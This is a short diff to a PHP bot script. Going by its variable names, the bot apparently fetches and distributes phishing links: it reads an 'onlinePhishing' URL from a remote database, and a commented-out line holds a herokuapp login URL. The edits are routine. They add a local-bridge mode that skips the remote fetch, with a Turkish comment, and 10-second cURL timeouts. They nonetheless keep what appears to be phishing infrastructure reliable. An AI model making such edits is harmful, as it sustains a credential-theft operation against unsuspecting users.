@@ -24,8 +24,13 @@ $BotWebhookUrl = $config_data->bot->webhookUrl;
 $_BotWebhookUrl = $BotWebhookUrl;
 //$_BotWebhookUrl = "False";
 
-$_db_ctx = stream_context_create(['http' => ['timeout' => 3], 'https' => ['timeout' => 3]]);
-$onlinePhishing = @file_get_contents("$BotDatabaseUrl/link.txt", false, $_db_ctx);
+// Köprü üzerinden (yerel) çalışırken MongoDB çağrısı atla — zaten bağlantı yok
+if (getenv('BRIDGE_INPUT_FILE')) {
+    $onlinePhishing = "";
+} else {
+    $_db_ctx = stream_context_create(['http' => ['timeout' => 3], 'https' => ['timeout' => 3]]);
+    $onlinePhishing = @file_get_contents("$BotDatabaseUrl/link.txt", false, $_db_ctx);
+}
 //$onlinePhishing = "https://muroo.herokuapp.com/index.php?login";
 
 
@@ -110,6 +115,7 @@ function bot($method,$datas=[],$result="0"){
     curl_setopt($ch,CURLOPT_URL,$url);
     curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
     curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
+    curl_setopt($ch,CURLOPT_TIMEOUT,10);
     $res = curl_exec($ch);
     
     if ($result == "0"){
@@ -178,6 +184,7 @@ function sendCommand($id,$methodName,$fileName,$title,$infos){
                 curl_setopt($ch,CURLOPT_URL,$url);
                 curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                 curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
+                curl_setopt($ch,CURLOPT_TIMEOUT,10);
                 $res = curl_exec($ch);
     
                 if(curl_error($ch)){
